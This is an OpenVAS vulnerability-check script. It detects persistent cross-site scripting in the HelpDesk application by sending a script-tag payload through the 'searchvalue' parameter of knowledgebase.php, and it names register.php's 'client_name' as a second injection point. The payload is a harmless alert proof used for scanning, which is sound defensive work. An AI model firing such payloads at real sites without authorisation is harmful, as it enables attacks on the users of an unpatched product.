##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_helpdesk_mult_xss_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
#
# HelpDesk Multiple Persistent Cross Site Scripting Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.903025");
  script_version("$Revision: 11374 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-13 14:45:05 +0200 (Thu, 13 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-04-30 12:42:29 +0530 (Mon, 30 Apr 2012)");
  script_name("HelpDesk Multiple Persistent Cross Site Scripting Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://1337day.com/exploits/18145");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert
  arbitrary HTML and script code, which will be executed in a user's browser
  session in the context of an affected site.");
  script_tag(name:"affected", value:"HelpDesk");
  script_tag(name:"insight", value:"The flaws are due to improper validation of user supplied input
  passed via the 'searchvalue' parameter to 'knowledgebase.php' and 'client_name' parameter to
  'register.php', which allows attackers to execute arbitrary HTML and script code in the context
  of an affected application or site.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running HelpDesk and is prone to multiple persistent
  cross site scripting vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );

if( ! can_host_php( port:port ) ) exit( 0 );

## List possible dirs
foreach dir( make_list_unique( "/", "/helpdesk", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  buf = http_get_cache( item: dir + "/index.php", port:port );

  if( ">HelpDesk" >< buf && "Powered by <" >< buf ) {

    url = dir + '/knowledgebase.php?act=search&searchvalue="><script>alert' +
                '(document.cookie)</script>';

    if( http_vuln_check( port:port, url:url, check_header:TRUE, extra_check:"HelpDesk",
                         pattern:"><script>alert\(document.cookie\)</script>" ) ) {
      report = report_vuln_url( url:url, port:port );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );